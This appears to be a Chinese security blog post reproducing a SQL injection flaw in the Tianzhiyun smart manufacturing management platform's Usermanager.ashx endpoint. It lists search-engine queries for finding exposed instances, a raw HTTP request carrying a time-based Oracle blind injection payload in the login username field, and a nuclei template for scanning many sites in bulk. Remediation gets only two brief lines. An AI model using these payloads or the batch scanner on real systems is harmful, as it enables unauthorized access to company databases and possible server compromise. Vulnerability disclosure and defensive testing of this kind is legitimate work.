#  【漏洞复现 | 含批量POC】天智云智造管理平台 Usermanager.ashx SQL注入漏洞   
小明同学  小明信安   2024-06-10 16:37  
  
**0x01 免责声明**  
  
disclaimer  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。信息及工具收集于互联网，真实性及安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
**0x02 漏洞介绍**  
  
Vulnerability introduction  
  
    天智云智造管理平台是向中小型生产企业提供一站式平台服务，串联销售/采购/生产/质量/仓库等各个部门。对内可以节约成本，规范生产过程，实现质量追溯，实时跟踪生产及库存数据，提升管理水平。对外可以提升工厂的软实力，帮助企业更好的接单。   
  
    天智云智造管理平台/Ashx/Usermanager.ashx接口存在SQL注入漏洞，攻击者可以通过漏洞获取服务器内敏感信息导致信息泄露，甚至通过漏洞写入木马病毒获取服务器权限。  
  
**0x03 搜索语法**  
  
Search for syntax  
  
- Fofa：  
  
  
```
body="Ashx/Usermanager.ashx"
```  
  
- Hunter  
  
  
```
body="Ashx/Usermanager.ashx"
```  
  
- Quake  
  
  
```
body="Ashx/Usermanager.ashx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSL5s5pPsEwhI5Vlwxb7Y1WM80qa9Rw35pgC50VWQyraJtZm7iayVYdKicEGB9a1MWibhiaWw4gn8nJJsQ/640?wx_fmt=png&from=appmsg "")  
  
**0x04 漏洞复现**  
  
Request packets  
  
- SQL延时注入2秒  
  
```
POST /Ashx/Usermanager.ashx HTTP/1.1
Host: your-ip
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
 
type=LOGIN&username=11') AND 3603=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(100)||CHR(72)||CHR(107),2) AND ('WTiY'='WTiY&pwd=1&vendor=

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSL5s5pPsEwhI5Vlwxb7Y1WMEgKXFRLoFhSYwKHCMIIywShUcIQkWQHzqCoCvRNqkQMCiaibzu2jzFMg/640?wx_fmt=png&from=appmsg "")  
- 延时4秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSL5s5pPsEwhI5Vlwxb7Y1WMiaG8rybRd4jr6BxZIdadmpRt9z638ibIibeYNgZncpbiajx8WYn2Kudibkg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x05 nuclei POC**  
  
nuclei POC  
  
- Nuclei 批量检测POC  
  
- 所用方法nuclei.exe -l 网址文件.txt -t POC.yaml  
  
```
id: tzyun_Usermanager_SQL_injected

info:
  name: tzyun_Usermanager_SQL_injected
  author: security-xm
  severity: high
  description: 天智云智造管理平台/Ashx/Usermanager.ashx存在SQL注入漏洞
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- raw:
  - |
    @timeout: 30s
    POST /Ashx/Usermanager.ashx HTTP/1.1
    Host: {{Hostname}}
    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    X-Requested-With: XMLHttpRequest
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 133

    type=LOGIN&username=11') AND 3603=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(100)||CHR(72)||CHR(107),4) AND ('WTiY'='WTiY&pwd=1&vendor=

  redirects: true
  matchers-condition: and
  matchers:
  - id: 1
    type: dsl
    dsl:
    - 'duration>=4'

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/WfB6o4vicwSL5s5pPsEwhI5Vlwxb7Y1WMbibuVufkLRg6ic4b3bsWDuSGRklvvDKSuRdlJYJX0WAmCTmmq84UEqRg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x07 修复建议**  
  
Remediation recommendations  
  
- 在Web应用防火墙中添加接口临时黑名单规则  
  
- 联系厂商打补丁或升级版本。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/WfB6o4vicwSISMoBvibVByMUlExr9ibqmnwWAbwiaNjO1XPzIHNbfEIfgfSHeJqDSHqIw8pXKSdgic1vSia8HhntX5lw/640?wx_fmt=gif&from=appmsg "")  
  
  
